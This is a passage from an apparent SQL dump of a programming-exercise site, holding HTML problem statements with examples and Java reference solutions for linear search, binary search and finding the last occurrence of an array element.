normal;\"><span style=\"white-space:pre\">		</span>variance = sum/(n);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>sd = Math.sqrt(variance);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.printf(\"%.2f\", sd);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',31,'','',''),(1130,'Basic Linear Search','basic-linear-search','<p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-ansi-language:EN-US\">A\r\ntechnique used in computer science to locate an element&nbsp;in an\r\narray&nbsp;is called sequential or linear search. It goes through the array\r\nelement&nbsp;by element&nbsp;until a match is found or all of the\r\nelements&nbsp;have been searched. Get an array of Integers <i>arr[]</i> with size <i>n</i> and\r\nelement <i>e</i> to be found. Apply Linear\r\nSearch to find the element <i>e</i> in the array\r\n<i>arr[].</i> If element e is found, print\r\nits index; if not, print -1.<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-ansi-language:EN-US\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Examples</span></b></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">2<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n2:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">-1<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class SearchL</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,pos=-1;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Linear Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[i]==e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>pos = i;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.print(pos);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1131,'Basic Binary Search','basic-binary-search','<p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">The middle element of the array is compared to the\r\ntarget value in a binary search. If they aren\'t equal, the method determines\r\nwhich side of the array the element is in (left or right) and repeats the same\r\nprocess&nbsp;until it finds the element. </span><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-ansi-language:EN-US\">Get an\r\narray of Integers <i>arr[]</i> with size <i>n</i> and element <i>e</i> to be found. Apply Linear Search to find the element <i>e</i> in the array <i>arr[].</i> If element e is found, print its index; if not, print -1.<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Examples<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">2<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n2:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">-1<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class SearchB</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,pos=-1;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int left=0, right=n-1;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Binary Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>while(left&lt;=right)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>int mid = (left+right)/2;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[mid]==e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>pos = mid;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>else if(arr[mid]&gt;e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>right = mid-1;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>else</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>left = mid+1;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.println(pos);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1132,'Find the Last Occurrence of an Element','find-the-last-occurrence-of-an-element','<p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-ansi-language:EN-US\">Get an\r\narray of Integers <i>arr[]</i> with size <i>n</i> and element <i>e</i> to be found. Apply Linear Search / Binary Search to find the\r\nelement <i>e</i>’s last occurrence position<i> </i>in the array <i>arr[].</i> If element e is found, print its last occurred index; if not\r\nfound, print -1.<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Examples<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 9 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">-1<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n3:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n3:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">2<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class SearchLO</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,e,pos=-1;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>e = input.nextInt();</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Linear Search</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = n-1; i&gt;=0; i--)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[i]==e)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>pos = i;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>System.out.print(pos);</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1133,'Find the Second Occurrence of the Element','find-the-second-occurrence-of-the-element','<p class=\"MsoNormal\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">Get an\r\narray of Integers </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">arr[]</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> with size </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">n</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> and element </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">e</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> to be found. Apply Linear Search / Binary Search to find the\r\nelement </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">e</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">’s second occurrence\r\nposition</span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> </i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">in the array </span><i style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\">arr[].</i><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; text-align: justify;\"> If element e is found, print its second\r\noccurred index; if not found or occurred less than 2 times, print -1.</span><br></p><p class=\"MsoNormal\"><span lang=\"EN-US\" style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Examples<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 9 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">4<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Output\r\n2:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">-1<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">Input\r\n3:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">5\r\n7 9 3 1 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"font-size:13.0pt;color:black\">9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span 